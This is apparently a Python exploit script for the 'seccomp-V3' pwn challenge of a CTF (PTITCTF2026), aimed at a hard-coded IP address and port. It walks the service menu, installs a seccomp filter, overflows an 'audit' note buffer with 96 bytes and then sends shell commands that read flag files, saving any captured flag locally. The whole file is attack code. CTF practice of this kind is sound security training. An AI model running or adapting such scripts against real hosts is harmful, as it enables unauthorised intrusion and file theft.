#!/usr/bin/env python3
"""
Exploit seccomp-V3 and capture flag
Target: 144.79.188.39:40917
"""
import re
import socket
import struct
import time
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "144.79.188.39", 40917

def run():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((HOST, PORT))

    def recv_until(delim):
        data = b""
        while delim not in data:
            chunk = s.recv(1024)
            if not chunk: break
            data += chunk
        return data

    log.info("Step 1: Selecting Example 1 (allow open/read/write)...")
    recv_until(b"-1) exit\n")
    s.sendall(b"0\n")
    recv_until(b"1) use examples\n")
    s.sendall(b"1\n")
    recv_until(b"3) kill all\n")
    s.sendall(b"1\n")
    
    log.info("Step 2: Installing Seccomp Filter...")
    recv_until(b"-1) exit\n")
    s.sendall(b"3\n")
    
    log.info("Step 3: Triggering Audit Buffer Overflow...")
    recv_until(b"-1) exit\n")
    s.sendall(b"5\n")
    recv_until(b"size?\n")
    s.sendall(b"96\n")
    recv_until(b"note?\n")
    
    # 96 bytes payload
    payload = b"A" * 96
    s.sendall(payload)
    
    time.sleep(0.5)
    
    # Send commands to dump flag
    s.sendall(b"cat /flag.txt; cat /home/ctf/flag.txt; cat flag.txt\n")
    time.sleep(1)
    
    data = b""
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
        except: break
        
    log.info(f"Received output from target:\n{data.decode(errors='replace')}")
    
    m = re.search(rb"PTITCTF\{[^}]+\}", data)
    if m:
        flag = m.group(0).decode()
        log.success(f"*** FLAG CAPTURED: {flag} ***")
        with open(r"D:\download\CTFTimeWriteup\PTITCTF2026\Pwn\seccomp-V3\final_flag.txt", "w") as f:
            f.write(flag)
        with open(r"D:\download\CTFTimeWriteup\PTITCTF2026\Pwn\seccomp-V3\writeup\final_flag.txt", "w") as f:
            f.write(flag)
            
    s.close()

if __name__ == "__main__":
    run()
